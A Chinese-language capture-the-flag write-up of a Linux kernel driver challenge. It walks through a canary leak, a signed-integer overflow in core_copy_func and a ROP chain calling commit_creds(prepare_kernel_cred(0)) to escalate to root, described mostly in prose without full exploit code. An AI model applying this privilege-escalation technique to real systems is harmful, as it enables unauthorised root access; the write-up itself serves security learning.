0x01 题目基本信息

题目解压出来有4个文件：bzImage、core.cpio、start.sh、vmlinux。
bzImage是镜像文件
core.cpio：这是一个打包后的文件，里面包含文件系统，其中vmlinux文件是内核的二进制文件，相当于pwn题中的libc。
start.sh：是启动脚本。
修改start.sh文件中的64M为128M。

可以看到开启了kaslr保护。

0x02 漏洞分析

将core.ko丢进ida查看逻辑。

查看init_module函数和fop结构体


可以看到驱动文件创建在proc目录下的core文件。




可以看到fop结构体中只实现了core_wirte、core_ioctl、core_release三个回调函数。core_read、core_copy_func但是这俩是驱动内部的函数，是不能由用户程序来调用的。

core_ioctl

函数根据传进去的参数，分别进行不同的操作。当参数为0x6677889C时，可以对off变量进行操作。

core_read

read函数将栈上偏移off处的数据读取到用户态变量中，由上面可知，off变量可以控制，就是可以将栈上任意偏移处的数据读取到用户态变量中，程序开启了canary保护，这里可以泄漏canary值。

core_copy_func

参数a1传进来的是signed int，但是在进行拷贝的时候将其转换成了unsigned int，这里存在整数溢出，若a1传进来为负数，转换后会是一个很大的数，会导致溢出。

core_write

core_write函数会设置name值，name在bss段，rop可以从这里传入，先保存到bss段中，然后core_copy_func函数将其拷贝到内核栈上。

0x03 漏洞利用

漏洞利用思路：

  1. 设置off值，泄漏canary。
  2. 通过write函数往全局变量name写rop_chain。
  3. 通过core_copy_func函数将保存在全局变量中的rop_chain拷贝到内核栈上。
  4. 通过rop执行commit_creds(prepare_kernel_cred(0))提权
  5. 返回到用户态，getshell。

获取commit_creds、prapare_kernel_cred函数地址

  1. 可以通过读取/tmp/kallsyms文件直接获取。

    grep commit_creds /tmp/kallsyms和grep prepare_kernel_cred /tmp/kallsyms

  2. 由于commit_creds、prapare_kernel_cred函数在vmlinux中的偏移固定，可以得到加载后的vmlinux基地址，减去commit_creds、prapare_kernel_cred函数在vmlinux文件中的偏移来得到。
    首先获取两函数在vmlinux文件中的固定偏移：

启动qemu，在qemu中查看/proc/kallsyms中的 commit_creds 函数地址

得到vmlinux基地址 = 0xffffffffa909c8e0 - 0x9c8e0 = 0xffffffffa9000000。

获取gadget

可以在gadget中查找，ctf-wiki上面说了两种方法，我用的ROPgadget，只能说慢的感人。

保存用户环境

在进入内核态之前要进行的操作：swapgs、交换栈顶、push保存各种寄存器的值。
这是push保存各寄存器时最重要的几个操作。

这几个操作是恢复用户态时需要关注的5个寄存器，而且顺序是固定的。这部分可以用一个专门的函数实现，预先将这5个寄存器变量值保存到用户变量里，然后在playload中按照顺序部署。

ROP链构造

  1. 控制程序流执行commit_creds(prepare_kernel_cred(0))
  2. 执行swapgs；iretq，回到用户态。
